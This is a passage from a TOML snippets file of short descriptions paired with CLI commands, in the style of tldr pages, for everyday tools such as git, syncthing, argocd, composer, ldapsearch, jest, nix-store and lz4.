  command = "hostess del <local.example.com>"
  output = ""

[[snippets]]
  description = "Disable a domain (but don't remove it)"
  command = "hostess off <local.example.com>"
  output = ""

[[snippets]]
  description = "Make a STUN request"
  command = "pystun3"
  output = ""

[[snippets]]
  description = "Make a STUN request and specify the stun server"
  command = "pystun3 --stun-host <stun.1und1.de>"
  output = ""

[[snippets]]
  description = "Make a STUN request and specify the source port"
  command = "pystun3 --source-port <7932>"
  output = ""

[[snippets]]
  description = "Show the progress of running coreutils"
  command = "progress"
  output = ""

[[snippets]]
  description = "Show the progress of running coreutils in quiet mode"
  command = "progress -q"
  output = ""

[[snippets]]
  description = "Launch and monitor a single long-running command"
  command = "<command> & progress --monitor --pid $!"
  output = ""

[[snippets]]
  description = "Include an estimate of time remaining for completion"
  command = "progress --wait --command <firefox>"
  output = ""

[[snippets]]
  description = "Start Syncthing"
  command = "syncthing"
  output = ""

[[snippets]]
  description = "Start Syncthing without opening a web browser"
  command = "syncthing -no-browser"
  output = ""

[[snippets]]
  description = "Print the device ID"
  command = "syncthing -device-id"
  output = ""

[[snippets]]
  description = "Change the home directory"
  command = "syncthing -home=<path/to/directory>"
  output = ""

[[snippets]]
  description = "Force a full index exchange"
  command = "syncthing -reset-deltas"
  output = ""

[[snippets]]
  description = "Change the address upon which the web interface listens"
  command = "syncthing -gui-address=<ip_address:port|path/to/socket.sock>"
  output = ""

[[snippets]]
  description = "Show filepaths to the files used by Syncthing"
  command = "syncthing -paths"
  output = ""

[[snippets]]
  description = "Disable the Syncthing monitor process"
  command = "syncthing -no-restart"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr az"
  output = ""

[[snippets]]
  description = "Show the sequence of commits starting from the current one, in reverse chronological order of the Git repository in the current working directory"
  command = "git log"
  output = ""

[[snippets]]
  description = "Show the history of a particular file or directory, including differences"
  command = "git log -p <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Show an overview of which file(s) changed in each commit"
  command = "git log --stat"
  output = ""

[[snippets]]
  description = "Show a graph of commits in the current branch using only the first line of each commit message"
  command = "git log --oneline --graph"
  output = ""

[[snippets]]
  description = "Show a graph of all commits, tags and branches in the entire repo"
  command = "git log --oneline --decorate --all --graph"
  output = ""

[[snippets]]
  description = "Show only commits whose messages include a given string (case-insensitively)"
  command = "git log -i --grep <search_string>"
  output = ""

[[snippets]]
  description = "Show the last N commits from a certain author"
  command = "git log -n <number> --author=<author>"
  output = ""

[[snippets]]
  description = "Show commits between two dates (yyyy-mm-dd)"
  command = "git log --before=""<2017-01-29>"" --after=""<2017-01-17>"""
  output = ""

[[snippets]]
  description = "View documentation for the updated command"
  command = "tldr aria2c"
  output = ""

[[snippets]]
  description = "List all secrets"
  command = "k8sec list"
  output = ""

[[snippets]]
  description = "List a specific secret as a base64-encoded string"
  command = "k8sec list <secret_name> --base64"
  output = ""

[[snippets]]
  description = "Set a secret's value"
  command = "k8sec set <secret_name> <key=value>"
  output = ""

[[snippets]]
  description = "Set a base64-encoded value"
  command = "k8sec set --base64 <secret_name> <key=encoded_value>"
  output = ""

[[snippets]]
  description = "Unset a secret"
  command = "k8sec unset <secret_name>"
  output = ""

[[snippets]]
  description = "Load secrets from a file"
  command = "k8sec load -f <path/to/file> <secret_name>"
  output = ""

[[snippets]]
  description = "Dump secrets to a file"
  command = "k8sec dump -f <path/to/file> <secret_name>"
  output = ""

[[snippets]]
  description = "Execute a code snippet"
  command = "ngs -e ""<echo('ngs is executed')>"""
  output = ""

[[snippets]]
  description = "Execute a script"
  command = "ngs <path/to/script.ngs>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "ngs --version"
  output = ""

[[snippets]]
  description = "Select full path and size from temporary or configuration files in a given directory"
  command = "fselect size, path from <path/to/directory> where name = <'*.cfg'> or name = <'*.tmp'>"
  output = ""

[[snippets]]
  description = "Find square images"
  command = "fselect path from <path/to/directory> where width = height"
  output = ""

[[snippets]]
  description = "Find old-school rap 320kbps MP3 files"
  command = "fselect path from <path/to/directory> where genre = <Rap> and bitrate = <320> and mp3_year lt <2000>"
  output = ""

[[snippets]]
  description = "Select only the first 5 results and output as JSON"
  command = "fselect size, path from <path/to/directory> limit <5> into json"
  output = ""

[[snippets]]
  description = "Use SQL aggregate functions to calculate minimum, maximum and average size of files in a directory"
  command = "fselect ""<MIN(size), MAX(size), AVG(size), SUM(size), COUNT(*)> from <path/to/directory>"""
  output = ""

[[snippets]]
  description = "List applications"
  command = "argocd app list --output <json|yaml|wide>"
  output = ""

[[snippets]]
  description = "Get application details"
  command = "argocd app get <app_name> --output <json|yaml|wide>"
  output = ""

[[snippets]]
  description = "Deploy application internally (to the same cluster that Argo CD is running in)"
  command = "argocd app create <app_name> --repo <git_repo_url> --path <path/to/repo> --dest-server https://kubernetes.default.svc --dest-namespace <ns>"
  output = ""

[[snippets]]
  description = "Delete an application"
  command = "argocd app delete <app_name>"
  output = ""

[[snippets]]
  description = "Enable application auto-sync"
  command = "argocd app set <app_name> --sync-policy auto --auto-prune --self-heal"
  output = ""

[[snippets]]
  description = "Preview app synchronization without affecting cluster"
  command = "argocd app sync <app_name> --dry-run --prune"
  output = ""

[[snippets]]
  description = "Show application deployment history"
  command = "argocd app history <app_name> --output <wide|id>"
  output = ""

[[snippets]]
  description = "Rollback application to a previous deployed version by history ID (deleting unexpected resources)"
  command = "argocd app rollback <app_name> <history_id> --prune"
  output = ""

[[snippets]]
  description = "Switch the priority of two tasks"
  command = "pueue switch <task_id1> <task_id2>"
  output = ""

[[snippets]]
  description = "List all queues"
  command = "sqsc lq <queue_prefix>"
  output = ""

[[snippets]]
  description = "List all messages in a queue"
  command = "sqsc ls <queue_name>"
  output = ""

[[snippets]]
  description = "Copy all messages from one queue to another"
  command = "sqsc cp <source_queue> <destination_queue>"
  output = ""

[[snippets]]
  description = "Move all messages from one queue to another"
  command = "sqsc mv <source_queue> <destination_queue>"
  output = ""

[[snippets]]
  description = "Describe a queue"
  command = "sqsc describe <queue_name>"
  output = ""

[[snippets]]
  description = "Query a queue with SQL syntax"
  command = "sqsc query ""SELECT body FROM <queue_name> WHERE body LIKE '%user%'"""
  output = ""

[[snippets]]
  description = "Pull all messages from a queue into a local SQLite database in your present working directory"
  command = "sqsc pull <queue_name>"
  output = ""

[[snippets]]
  description = "Archive a file, replacing it with a 7zipped compressed version"
  command = "p7zip <path/to/file>"
  output = ""

[[snippets]]
  description = "Archive a file keeping the input file"
  command = "p7zip -k <path/to/file>"
  output = ""

[[snippets]]
  description = "Decompress a file, replacing it with the original uncompressed version"
  command = "p7zip -d <compressed.ext>.7z"
  output = ""

[[snippets]]
  description = "Decompress a file keeping the input file"
  command = "p7zip -d -k <compressed.ext>.7z"
  output = ""

[[snippets]]
  description = "Skip some checks and force compression or decompression"
  command = "p7zip -f <path/to/file>"
  output = ""

[[snippets]]
  description = "Copy specific files from a remote"
  command = "git rscp <remote_name> <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Copy a specific directory from a remote"
  command = "git rscp <remote_name> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Search `nixpkgs` for a package based on its name or description"
  command = "nix search <nixpkgs> <search_term...>"
  output = ""

[[snippets]]
  description = "Show description of a package from nixpkgs"
  command = "nix search <nixpkgs#pkg>"
  output = ""

[[snippets]]
  description = "Show all packages available from a flake on github"
  command = "nix search <github:owner/repo>"
  output = ""

[[snippets]]
  description = "List Azure Advisor configuration for the entire subscription"
  command = "az advisor configuration list"
  output = ""

[[snippets]]
  description = "Show Azure Advisor configuration for the given subscription or resource group"
  command = "az advisor configuration show --resource_group <resource_group>"
  output = ""

[[snippets]]
  description = "List Azure Advisor recommendations"
  command = "az advisor recommendation list"
  output = ""

[[snippets]]
  description = "Enable Azure Advisor recommendations"
  command = "az advisor recommendation enable --resource_group <resource_group>"
  output = ""

[[snippets]]
  description = "Disable Azure Advisor recommendations"
  command = "az advisor recommendation disable --resource_group <resource_group>"
  output = ""

[[snippets]]
  description = "Run GDB server on port 4500"
  command = "st-util -p <4500>"
  output = ""

[[snippets]]
  description = "Connect to GDB server"
  command = "(gdb) target extended-remote <localhost>:<4500>"
  output = ""

[[snippets]]
  description = "Write firmware to device"
  command = "(gdb) load <firmware.elf>"
  output = ""

[[snippets]]
  description = "Install a repository's specified submodules"
  command = "git submodule update --init --recursive"
  output = ""

[[snippets]]
  description = "Add a Git repository as a submodule"
  command = "git submodule add <repository_url>"
  output = ""

[[snippets]]
  description = "Add a Git repository as a submodule at the specified directory"
  command = "git submodule add <repository_url> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Update every submodule to its latest commit"
  command = "git submodule foreach git pull"
  output = ""

[[snippets]]
  description = "Execute a specific command using the current environment variables"
  command = "exec <command -with -flags>"
  output = ""

[[snippets]]
  description = "Synchronize once, without enabling autorefresh"
  command = "offlineimap -o"
  output = ""

[[snippets]]
  description = "Synchronize a specific account"
  command = "offlineimap -a <account>"
  output = ""

[[snippets]]
  description = "Synchronize a specific folder"
  command = "offlineimap -f <folder>"
  output = ""

[[snippets]]
  description = "Check for breaking changes since the last tag"
  command = "roave-backward-compatibility-check"
  output = ""

[[snippets]]
  description = "Check for breaking changes since a specific tag"
  command = "roave-backward-compatibility-check --from=<git_reference>"
  output = ""

[[snippets]]
  description = "Check for breaking changes between the last tag and a specific reference"
  command = "roave-backward-compatibility-check --to=<git_reference>"
  output = ""

[[snippets]]
  description = "Check for breaking changes and output to Markdown"
  command = "roave-backward-compatibility-check --format=markdown > <results.md>"
  output = ""

[[snippets]]
  description = "Search for a pattern within a file"
  command = "xzgrep ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Search for an exact string (disables regular expressions)"
  command = "xzgrep --fixed-strings ""<exact_string>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Search for a pattern in all files showing line numbers of matches"
  command = "xzgrep --line-number ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Use extended regular expressions (supports `?`, `+`, `{}`, `()` and `|`), in case-insensitive mode"
  command = "xzgrep --extended-regexp --ignore-case ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Print 3 lines of context around, before, or after each match"
  command = "xzgrep --<context|before-context|after-context>=<3> ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Print file name and line number for each match with color output"
  command = "xzgrep --with-filename --line-number --color=always ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Search for lines matching a pattern, printing only the matched text"
  command = "xzgrep --only-matching ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Interactively create a `composer.json` file"
  command = "composer init"
  output = ""

[[snippets]]
  description = "Add a package as a dependency for this project, adding an entry to `composer.json`"
  command = "composer require <user/package>"
  output = ""

[[snippets]]
  description = "Install all the dependencies in this project's `composer.json` and create `composer.lock`"
  command = "composer install"
  output = ""

[[snippets]]
  description = "Uninstall a package from this project, removing it as a dependency from `composer.json` and `composer.lock`"
  command = "composer remove <user/package>"
  output = ""

[[snippets]]
  description = "Update all the dependencies in this project's `composer.json` and note new versions in `composer.lock` file"
  command = "composer update"
  output = ""

[[snippets]]
  description = "Update only `composer.lock` after updating `composer.json` manually"
  command = "composer update --lock"
  output = ""

[[snippets]]
  description = "Learn more about why a dependency can't be installed"
  command = "composer why-not <user/package>"
  output = ""

[[snippets]]
  description = "Update composer to its latest version"
  command = "composer self-update"
  output = ""

[[snippets]]
  description = "Show total blame count"
  command = "git guilt"
  output = ""

[[snippets]]
  description = "Calculate the change in blame between two revisions"
  command = "git guilt <first_revision> <last_revision>"
  output = ""

[[snippets]]
  description = "Show author emails instead of names"
  command = "git guilt --email"
  output = ""

[[snippets]]
  description = "Ignore whitespace only changes when attributing blame"
  command = "git guilt --ignore-whitespace"
  output = ""

[[snippets]]
  description = "Find blame delta over the last three weeks"
  command = "git guilt 'git log --until=""3 weeks ago"" --format=""%H"" -n 1'"
  output = ""

[[snippets]]
  description = "Find blame delta over the last three weeks (git 1.8.5+)"
  command = "git guilt @{3.weeks.ago}"
  output = ""

[[snippets]]
  description = "Read an IDX file for a Git packfile and dump its contents to `stdout`"
  command = "git show-index <path/to/file.idx>"
  output = ""

[[snippets]]
  description = "Specify the hash algorithm for the index file (experimental)"
  command = "git show-index --object-format=<sha1|sha256> <path/to/file>"
  output = ""

[[snippets]]
  description = "Create a new Laravel application"
  command = "laravel new <name>"
  output = ""

[[snippets]]
  description = "Use the latest development release"
  command = "laravel new <name> --dev"
  output = ""

[[snippets]]
  description = "Overwrite if the directory already exists"
  command = "laravel new <name> --force"
  output = ""

[[snippets]]
  description = "Install the Laravel Jetstream scaffolding"
  command = "laravel new <name> --jet"
  output = ""

[[snippets]]
  description = "Install the Laravel Jetstream scaffolding with a specific stack"
  command = "laravel new <name> --jet --stack <livewire|inertia>"
  output = ""

[[snippets]]
  description = "Install the Laravel Jetstream scaffolding with support for teams"
  command = "laravel new <name> --jet --teams"
  output = ""

[[snippets]]
  description = "List the available installer commands"
  command = "laravel list"
  output = ""

[[snippets]]
  description = "Install a package from <https://crates.io> (the version is optional - latest by default)"
  command = "cargo install <package>@<version>"
  output = ""

[[snippets]]
  description = "Install a package from the specified Git repository"
  command = "cargo install --git <repo_url>"
  output = ""

[[snippets]]
  description = "Build from the specified branch/tag/commit when installing from a Git repository"
  command = "cargo install --git <repo_url> --<branch|tag|rev> <branch_name|tag|commit_hash>"
  output = ""

[[snippets]]
  description = "List all installed packages and their versions"
  command = "cargo install --list"
  output = ""

[[snippets]]
  description = "List printers present on the machine and whether they are enabled for printing"
  command = "lpstat -p"
  output = ""

[[snippets]]
  description = "Show the default printer"
  command = "lpstat -d"
  output = ""

[[snippets]]
  description = "Display all available status information"
  command = "lpstat -t"
  output = ""

[[snippets]]
  description = "List print jobs queued by a specific user"
  command = "lpstat -u <user>"
  output = ""

[[snippets]]
  description = "Colorize one or more ranked digraph (that were already processed by `dot`)"
  command = "gvcolor <path/to/layout1.gv> <path/to/layout2.gv ...> > <path/to/output.gv>"
  output = ""

[[snippets]]
  description = "Lay out a graph and colorize it, then convert to a PNG image"
  command = "dot <path/to/input.gv> | gvcolor | dot -T <png> > <path/to/output.png>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "gvcolor -?"
  output = ""

[[snippets]]
  description = "Print a file to `stdout` (status and progress messages are sent to `stderr`)"
  command = "ippeveps <path/to/file>"
  output = ""

[[snippets]]
  description = "Print a file from `stdin` to `stdout`"
  command = "<wget -O - https://examplewebsite.com/file> | ippeveps"
  output = ""

[[snippets]]
  description = "Copy a single file (open an editor with the source filename on the left and the target filename on the right)"
  command = "qcp <source_file>"
  output = ""

[[snippets]]
  description = "Copy multiple JPG files"
  command = "qcp <*.jpg>"
  output = ""

[[snippets]]
  description = "Copy files, but swap the positions of the source and the target filenames in the editor"
  command = "qcp --option swap <*.jpg>"
  output = ""

[[snippets]]
  description = "Start server serving the specified document root"
  command = "darkhttpd <path/to/docroot>"
  output = ""

[[snippets]]
  description = "Start server on specified port (port 8080 by default if running as non-root user)"
  command = "darkhttpd <path/to/docroot> --port <port>"
  output = ""

[[snippets]]
  description = "Listen only on specified IP address (by default, the server listens on all interfaces)"
  command = "darkhttpd <path/to/docroot> --addr <ip_address>"
  output = ""

[[snippets]]
  description = "Fetch dependencies specified in `Cargo.lock` (for all targets)"
  command = "cargo fetch"
  output = ""

[[snippets]]
  description = "Fetch dependencies for the specified target"
  command = "cargo fetch --target <target_triple>"
  output = ""

[[snippets]]
  description = "Replace environment variables in `stdin` and output to `stdout`"
  command = "echo '<$HOME>' | envsubst"
  output = ""

[[snippets]]
  description = "Replace environment variables in an input file and output to `stdout`"
  command = "envsubst < <path/to/input_file>"
  output = ""

[[snippets]]
  description = "Replace environment variables in an input file and output to a file"
  command = "envsubst < <path/to/input_file> > <path/to/output_file>"
  output = ""

[[snippets]]
  description = "Replace environment variables in an input file from a space-separated list"
  command = "envsubst '<$USER $SHELL $HOME>' < <path/to/input_file>"
  output = ""

[[snippets]]
  description = "Query an LDAP server for all items that are a member of the given group and return the object's displayName value"
  command = "ldapsearch -D '<admin_DN>' -w '<password>' -h <ldap_host> -b <base_ou> '<memberOf=group1>' displayName"
  output = ""

[[snippets]]
  description = "Query an LDAP server with a no-newline password file for all items that are a member of the given group and return the object's displayName value"
  command = "ldapsearch -D '<admin_DN>' -y '<password_file>' -h <ldap_host> -b <base_ou> '<memberOf=group1>' displayName"
  output = ""

[[snippets]]
  description = "Return 5 items that match the given filter"
  command = "ldapsearch -D '<admin_DN>' -w '<password>' -h <ldap_host> -b <base_ou> '<memberOf=group1>' -z 5 displayName"
  output = ""

[[snippets]]
  description = "Wait up to 7 seconds for a response"
  command = "ldapsearch -D '<admin_DN>' -w '<password>' -h <ldap_host> -b <base_ou> '<memberOf=group1>' -l 7 displayName"
  output = ""

[[snippets]]
  description = "Invert the filter"
  command = "ldapsearch -D '<admin_DN>' -w '<password>' -h <ldap_host> -b <base_ou> '(!(memberOf=<group1>))' displayName"
  output = ""

[[snippets]]
  description = "Return all items that are part of multiple groups, returning the display name for each item"
  command = "ldapsearch -D '<admin_DN>' -w '<password>' -h <ldap_host> '(&(<memberOf=group1>)(<memberOf=group2>)(<memberOf=group3>))' ""displayName"""
  output = ""

[[snippets]]
  description = "Return all items that are members of at least 1 of the specified groups"
  command = "ldapsearch -D '<admin_DN>' -w '<password>' -h <ldap_host> '(|(<memberOf=group1>)(<memberOf=group1>)(<memberOf=group3>))' displayName"
  output = ""

[[snippets]]
  description = "Combine multiple boolean logic filters"
  command = "ldapsearch -D '<admin_DN>' -w '<password>' -h <ldap_host> '(&(<memberOf=group1>)(<memberOf=group2>)(!(<memberOf=group3>)))' displayName"
  output = ""

[[snippets]]
  description = "Run all available tests"
  command = "jest"
  output = ""

[[snippets]]
  description = "Run the test suites from the given files"
  command = "jest <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Run the test suites from files within the current and subdirectories, whose paths match the given regular expression"
  command = "jest <regular_expression1> <regular_expression2>"
  output = ""

[[snippets]]
  description = "Run the tests whose names match the given regular expression"
  command = "jest --testNamePattern <regular_expression>"
  output = ""

[[snippets]]
  description = "Run test suites related to a given source file"
  command = "jest --findRelatedTests <path/to/source_file.js>"
  output = ""

[[snippets]]
  description = "Run test suites related to all uncommitted files"
  command = "jest --onlyChanged"
  output = ""

[[snippets]]
  description = "Watch files for changes and automatically re-run related tests"
  command = "jest --watch"
  output = ""

[[snippets]]
  description = "Display help"
  command = "jest --help"
  output = ""

[[snippets]]
  description = "Clone an existing repository to current directory (If run into authentication problem, try full ssh path)"
  command = "hub clone <remote_repository_location>"
  output = ""

[[snippets]]
  description = "Convert a PNM image to an RLE image"
  command = "pnmtorle <path/to/input.pnm> > <path/to/output.rle>"
  output = ""

[[snippets]]
  description = "Print PNM header information to `stdout`"
  command = "pnmtorle -verbose <path/to/input.pnm> > <path/to/output.rle>"
  output = ""

[[snippets]]
  description = "Include a transparency channel in the output image in which every black pixel is set to fully transparent and every other pixel is set to fully opaque"
  command = "pnmtorle -alpha <path/to/input.pnm> > <path/to/output.rle>"
  output = ""

[[snippets]]
  description = "Adjust one or more directed graphs to improve the layout aspect ratio"
  command = "unflatten <path/to/input1.gv> <path/to/input2.gv ...> > <path/to/output.gv>"
  output = ""

[[snippets]]
  description = "Use `unflatten` as a preprocessor for `dot` layout to improve aspect ratio"
  command = "unflatten <path/to/input.gv> | dot -T <png> <path/to/output.png>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "unflatten -?"
  output = ""

[[snippets]]
  description = "Display the names, values and descriptions of all PlatformIO settings"
  command = "pio settings get"
  output = ""

[[snippets]]
  description = "Display the name, value and description of a specific PlatformIO setting"
  command = "pio settings get <setting>"
  output = ""

[[snippets]]
  description = "Set a specific setting value"
  command = "pio settings set <setting> <value>"
  output = ""

[[snippets]]
  description = "Reset the values of all modified settings to their factory defaults"
  command = "pio settings reset"
  output = ""

[[snippets]]
  description = "Create a local Kubernetes cluster"
  command = "kind create cluster --name <cluster_name>"
  output = ""

[[snippets]]
  description = "Delete one or more clusters"
  command = "kind delete clusters <cluster_name>"
  output = ""

[[snippets]]
  description = "Get details about clusters, nodes, or the kubeconfig"
  command = "kind get <clusters|nodes|kubeconfig>"
  output = ""

[[snippets]]
  description = "Export the kubeconfig or the logs"
  command = "kind export <kubeconfig|logs>"
  output = ""

[[snippets]]
  description = "Remove the top directory from the stack and cd to it"
  command = "popd"
  output = ""

[[snippets]]
  description = "Remove the Nth directory (starting from zero to the left from the list printed with `dirs`)"
  command = "popd +N"
  output = ""

[[snippets]]
  description = "Remove the Nth directory (starting from zero to the right from the list printed with `dirs`)"
  command = "popd -N"
  output = ""

[[snippets]]
  description = "Remove the 1st directory (starting from zero to the left from the list printed with `dirs`)"
  command = "popd -n"
  output = ""

[[snippets]]
  description = "Start a Hive interactive shell"
  command = "hive"
  output = ""

[[snippets]]
  description = "Run HiveQL"
  command = "hive -e ""<hiveql_query>"""
  output = ""

[[snippets]]
  description = "Run a HiveQL file with a variable substitution"
  command = "hive --define <key>=<value> -f <path/to/file.sql>"
  output = ""

[[snippets]]
  description = "Run a HiveQL with HiveConfig (e.g. `mapred.reduce.tasks=32`)"
  command = "hive --hiveconf <conf_name>=<conf_value>"
  output = ""

[[snippets]]
  description = "Print "Hello, world!""
  command = "hello"
  output = ""

[[snippets]]
  description = "Print "hello, world", the traditional type"
  command = "hello --traditional"
  output = ""

[[snippets]]
  description = "Print a text message"
  command = "hello --greeting=""<greeting_text>"""
  output = ""

[[snippets]]
  description = "Collect garbage, such as removing unused paths"
  command = "nix-store --gc"
  output = ""

[[snippets]]
  description = "Hard-link identical files together to reduce space usage"
  command = "nix-store --optimise"
  output = ""

[[snippets]]
  description = "Delete a specific store path (must be unused)"
  command = "nix-store --delete </nix/store/...>"
  output = ""

[[snippets]]
  description = "Show all dependencies of a store path (package), in a tree format"
  command = "nix-store --query --tree </nix/store/...>"
  output = ""

[[snippets]]
  description = "Calculate the total size of a certain store path with all the dependencies"
  command = "du -cLsh $(nix-store --query --references </nix/store/...>)"
  output = ""

[[snippets]]
  description = "Show all dependents of a particular store path"
  command = "nix-store --query --referrers </nix/store/...>"
  output = ""

[[snippets]]
  description = "Create an S3 bucket"
  command = "aws s3 mb s3://<bucket_name>"
  output = ""

[[snippets]]
  description = "Create an S3 bucket in a specific region"
  command = "aws s3 mb s3://<bucket_name> --region <region>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "aws s3 mb help"
  output = ""

[[snippets]]
  description = "Convert an RLE image to a PNM file"
  command = "rletopnm <path/to/input.rle> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Create a PGM image containing the RLE file's alpha channel"
  command = "rletopnm -alphaout <path/to/alpha_file.pgm> <path/to/input.rle> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Operate in verbose mode and print the contents of the RLE header to `stdout`"
  command = "rletopnm -verbose <path/to/input.rle> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Check the CI status for this branch"
  command = "hub ci-status --verbose"
  output = ""

[[snippets]]
  description = "Display status of GitHub checks for a commit"
  command = "hub ci-status --verbose <commit_SHA>"
  output = ""

[[snippets]]
  description = "Unescape special XML characters from a string"
  command = "xml unescape ""<&lt;a1&gt;>"""
  output = ""

[[snippets]]
  description = "Unescape special XML characters from `stdin`"
  command = "echo ""<&lt;a1&gt;>"" | xml unescape"
  output = ""

[[snippets]]
  description = "Display help"
  command = "xml escape --help"
  output = ""

[[snippets]]
  description = "Start the interactive graph plotting shell"
  command = "gnuplot"
  output = ""

[[snippets]]
  description = "Plot the graph for the specified graph definition file"
  command = "gnuplot <path/to/definition.plt>"
  output = ""

[[snippets]]
  description = "Set the output format by executing a command before loading the definition file"
  command = "gnuplot -e ""<set output ""path/to/filename.png"" size 1024,768>"" <path/to/definition.plt>"
  output = ""

[[snippets]]
  description = "Persist the graph plot preview window after gnuplot exits"
  command = "gnuplot --persist <path/to/definition.plt>"
  output = ""

[[snippets]]
  description = "Pack the currently checked out commit into a `zip` archive"
  command = "git archive-file"
  output = ""

[[snippets]]
  description = "List jobs"
  command = "aws glue list-jobs"
  output = ""

[[snippets]]
  description = "Start a job"
  command = "aws glue start-job-run --job-name <job_name>"
  output = ""

[[snippets]]
  description = "Start running a workflow"
  command = "aws glue start-workflow-run --name <workflow_name>"
  output = ""

[[snippets]]
  description = "List triggers"
  command = "aws glue list-triggers"
  output = ""

[[snippets]]
  description = "Start a trigger"
  command = "aws glue start-trigger --name <trigger_name>"
  output = ""

[[snippets]]
  description = "Create a dev endpoint"
  command = "aws glue create-dev-endpoint --endpoint-name <name> --role-arn <role_arn_used_by_endpoint>"
  output = ""

[[snippets]]
  description = "Analyze the dependencies of a `.jar` or `.class` file"
  command = "jdeps <path/to/filename.class>"
  output = ""

[[snippets]]
  description = "Print a summary of all dependencies of a specific `.jar` file"
  command = "jdeps <path/to/filename.jar> -summary"
  output = ""

[[snippets]]
  description = "Print all class-level dependencies of a `.jar` file"
  command = "jdeps <path/to/filename.jar> -verbose"
  output = ""

[[snippets]]
  description = "Output the results of the analysis in a DOT file into a specific directory"
  command = "jdeps <path/to/filename.jar> -dotoutput <path/to/directory>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "jdeps --help"
  output = ""

[[snippets]]
  description = "Compress a file"
  command = "lz4 <path/to/file>"
  output = ""

[[snippets]]
  description = "Decompress a file"
  command = "lz4 -d <file.lz4>"
  output = ""

[[snippets]]
  description = "Decompress a file and write to `stdout`"
  command = "lz4 -dc <file.lz4>"
  output = ""

[[snippets]]
  description = "Package and compress a directory and its contents"
  command = "tar cvf - <path/to/directory> | lz4 - <dir.tar.lz4>"
  output = ""

[[snippets]]
  description = "Decompress and unpack a directory and its contents"
  command = "lz4 -dc <dir.tar.lz4> | tar -xv"
  output = ""

[[snippets]]
  description = "Compress a file using the best compression"
  command = "lz4 -9 <path/to/file>"
  output = ""

[[snippets]]
  description = "Create a new repository (requires the `CVSROOT` environment variable to be set externally)"
  command = "cvs -d <path/to/repository> init"
  output = ""

[[snippets]]
  description = "Add a project to the repository"
  command = "cvs import -m ""<message>"" <project_name> <version> <vendor>"
  output = ""

[[snippets]]
  description = "Checkout a project"
  command = "cvs checkout <project_name>"
  output = ""

[[snippets]]
  description = "Show changes made to files"
  command = "cvs diff <path/to/file>"
  output = ""

[[snippets]]
  description = "Add a file"
  command = "cvs add <path/to/file>"
  output = ""

[[snippets]]
  description = "Commit a file"
  command = "cvs commit -m ""<message>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Update the working directory from the remote repository"
  command = "cvs update"
  output = ""

[[snippets]]
  description = "Start an interactive Git shell"
  command = "git repl"
  output = ""

[[snippets]]
  description = "Run a Git command while in the interactive Git shell"
  command = "<git_subcommand> <command_arguments>"
  output = ""

[[snippets]]
  description = "Run an external (non-Git) command while in the interactive Git shell"
  command = "!<command> <command_arguments>"
  output = ""

[[snippets]]
  description = "Exit the interactive Git shell (or press Ctrl + D)"
  command = "exit"
  output = ""

[[snippets]]
  description = "Start `fzf` on all files in the specified directory"
  command = "find <path/to/directory> -type f | fzf"
  output = ""

[[snippets]]
  description = "Start `fzf` for running processes"
  command = "ps aux | fzf"
  output = ""

[[snippets]]
  description = "Select multiple files with `Shift + Tab` and write to a file"
  command = "find <path/to/directory> -type f | fzf --multi > <path/to/file>"
  output = ""

[[snippets]]
  description = "Start `fzf` with a specified query"
  command = "fzf --query ""<query>"""
  output = ""

[[snippets]]
  description = "Start `fzf` on entries that start with core and end with either go, rb, or py"
  command = "fzf --query ""^core go$ | rb$ | py$"""
  output = ""

[[snippets]]
  description = "Start `fzf` on entries that not match pyc and match exactly travis"
  command = "fzf --query ""!pyc 'travis"""
  output = ""

[[snippets]]
  description = "List installed applications"
  command = "cs list"
  output = ""

[[snippets]]
  description = "Install a specific application"
  command = "cs install <application_name>"
  output = ""

[[snippets]]
  description = "Uninstall a specific application"
  command = "cs uninstall <application_name>"
  output = ""

[[snippets]]
  description = "Setup machine for the Scala development"
  command = "cs setup"
  output = ""

[[snippets]]
  description = "Update all the installed applications"
  command = "cs update"
  output = ""

[[snippets]]
  description = "Display version"
  command = "cs version"
  output = ""

[[snippets]]
  description = "List security properties of an executable binary file"
  command = "checksec --file=<path/to/binary>"
  output = ""

[[snippets]]
  description = "List security properties recursively of all executable files in a directory"
  command = "checksec --dir=<path/to/directory>"
  output = ""

[[snippets]]
  description = "List security properties of a process"
  command = "checksec --proc=<pid>"
  output = ""

[[snippets]]
  description = "List security properties of the running kernel"
  command = "checksec --kernel"
  output = ""

[[snippets]]
  description = "Resize all JPEG images in the directory to 50% of their initial size"
  command = "mogrify -resize <50%> <*.jpg>"
  output = ""

[[snippets]]
  description = "Resize all images starting with `DSC` to 800x600"
  command = "mogrify -resize <800x600> <DSC*>"
  output = ""

[[snippets]]
  description = "Convert all PNGs in the directory to JPEG"
  command = "mogrify -format <jpg> <*.png>"
  output = ""

[[snippets]]
  description = "Halve the saturation of all image files in the current directory"
  command = "mogrify -modulate <100,50> <*>"
  output = ""

[[snippets]]
  description = "Double the brightness of all image files in the current directory"
  command = "mogrify -modulate <200> <*>"
  output = ""

[[snippets]]
  description = "Create a copy of the default configuration in your current working directory"
  command = "yolo task=init"
  output = ""

[[snippets]]
  description = "Train the object detection, instance segment, or classification model with the specified configuration file"
  command = "yolo task=<detect|segment|classify> mode=train cfg=<path/to/config.yaml>"
  output = ""

[[snippets]]
  description = "Send an email using the default account configured in `~/.msmtprc`"
  command = "echo ""<Hello world>"" | msmtp <to@example.org>"
  output = ""

[[snippets]]
